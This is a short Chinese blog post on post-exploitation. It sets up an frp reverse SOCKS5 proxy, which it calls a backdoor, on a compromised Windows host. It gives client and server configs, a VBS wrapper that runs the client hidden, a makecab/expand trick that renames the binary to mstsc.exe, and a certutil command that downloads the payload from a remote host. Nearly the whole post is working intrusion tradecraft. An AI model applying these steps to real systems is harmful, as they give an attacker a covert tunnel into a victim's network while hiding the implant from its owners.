# 后渗透 frp 创建反向socks代理

https://www.cnblogs.com/-mo-/p/12539341.htm 发布于 2020-03-21 14:50

后门文件配置：

```ini
#frpc.ini
[common]
server_addr = *.*.*.*
server_port = 7000
token = 123456

[socks_proxy]
type = tcp
remote_port =8888
plugin = socks5
```

```ini
#frps.ini
[common]
bind_addr =0.0.0.0
bind_port =7000
token = 123456
```

```python
#frpc.bat
frpc.exe -c frpc.ini

#frpc.vbs
Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c frpc.bat",vbhide
```

压缩解压:  
减少文件体积，提高文件上传速度，这里为了方便直接可以使用windows自带的压缩解压工具:

```bash
#压缩
makecab frpc.exe frpc.txt

#解压
expand C:\Users\RabbitMask\Desktop\test\frpc.txt C:\Users\RabbitMask\Desktop\test\mstsc.exe
```

远程下载:

```bash
certutil -urlcache -split -f http://192.168.1.1/frpc.txt  1.txt
```
